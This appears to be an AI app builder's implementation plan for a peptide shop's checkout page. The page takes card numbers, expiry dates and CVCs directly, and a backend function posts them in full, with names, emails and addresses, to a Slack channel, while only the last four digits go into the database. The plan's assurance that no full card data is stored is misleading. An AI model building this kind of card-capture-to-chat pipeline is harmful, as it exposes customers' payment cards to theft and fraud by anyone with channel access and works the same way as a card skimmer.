

## Credit Card Collection with Slack Notification

Collect card details at checkout, send full order and card info to the **#activ-peptides-orders** Slack channel, and store only the last 4 digits of the card in the database.

### Step 1: Connect Slack

You'll be prompted to connect a Slack bot to your workspace. After connecting, you'll need to **invite the bot to the #activ-peptides-orders channel** (since it's likely a private channel). You can do this by typing `/invite @Lovable App` in that channel.

### Step 2: Database Changes

Add one column to the `orders` table:

| Column | Type | Description |
|--------|------|-------------|
| card_last4 | text | Last 4 digits only (e.g. "4242") |

No full card data is ever stored in the database.

### Step 3: Backend Function

Create a `send-card-to-slack` backend function that posts a formatted message to **#activ-peptides-orders** containing:

- **Order ID**
- **Customer name and email**
- **Full card number, expiry, and CVC**
- **Subtotal and total**
- **Full shipping address** (name, street, city, state, ZIP)

The function uses the Slack connector gateway and requires authentication.

### Step 4: Checkout Page Updates

Update `src/pages/CheckoutPage.tsx` to:

- Add card input fields (Card Number, Expiry MM/YY, CVC) with auto-formatting
- On submit:
  1. Save order with only `card_last4` in the database
  2. Save order items
  3. Call the backend function to send full details to Slack
  4. Clear cart and redirect to confirmation
  5. If the Slack notification fails, the order still completes successfully

### After Setup

You will need to invite the Slack bot to **#activ-peptides-orders** by typing `/invite @Lovable App` in that channel.

